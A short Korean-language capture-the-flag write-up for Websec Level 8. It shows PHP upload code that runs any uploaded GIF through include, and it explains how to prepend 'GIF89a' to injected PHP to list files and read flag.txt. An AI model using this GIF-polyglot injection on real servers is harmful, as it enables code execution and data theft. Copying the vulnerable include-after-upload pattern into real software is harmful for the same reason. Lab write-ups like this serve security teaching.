---
title : "Websec - Level 8"
excerpt : "Websec Level 8 - Easy"
toc : true
toc_sticky: true
categories:
  - Websec
tags:
  - LFI using PHP injected GIF
---

## 1. Source code

``` php
$uploadedFile = sprintf('%1$s/%2$s', '/uploads', sha1($_FILES['fileToUpload']['name']) . '.gif');

if (file_exists ($uploadedFile)) { unlink ($uploadedFile); }

if ($_FILES['fileToUpload']['size'] <= 50000) {
    if (getimagesize ($_FILES['fileToUpload']['tmp_name']) !== false) {
        if (exif_imagetype($_FILES['fileToUpload']['tmp_name']) === IMAGETYPE_GIF) {
            move_uploaded_file ($_FILES['fileToUpload']['tmp_name'], $uploadedFile);
            echo '<p class="lead">Dump of <a href="/level08' . $uploadedFile . '">'. htmlentities($_FILES['fileToUpload']['name']) . '</a>:</p>';
            echo '<pre>';
            include_once($uploadedFile);
            echo '</pre>';
            unlink($uploadedFile);
        } 
        else { echo '<p class="text-danger">The file is not a GIF</p>'; }
    } 
    else { echo '<p class="text-danger">The file is not an image</p>'; }
} 
else { echo '<p class="text-danger">The file is too big</p>'; }
```

gif파일인지 검사를 하는 코드가 있어서 파일은 반드시 gif파일만 올릴 수 있음. 

## 2. Vulnerability

텍스트파일을 gif파일로 변환해서 업로드 한 뒤 burp suite로 보면은 GIF89a로 시작한다는 점을 알 수 있음. 이를 이용해서 문제를 풀 수 있음.


## 3. Solution

GIF89a만 남기고 print_r(scandir('./')); php 코드를 넣어주면 현재경로에 있는 파일을 볼 수 있음. 
```php
Array
(
    [0] => .
    [1] => ..
    [2] => flag.txt
    [3] => index.php
    [4] => php-fpm.sock
    [5] => source.php
    [6] => uploads
)
```
그 다음 file_get_contents함수를 이용해서 flag.txt 파일을 읽어 플래그를 흭득하면 됨.
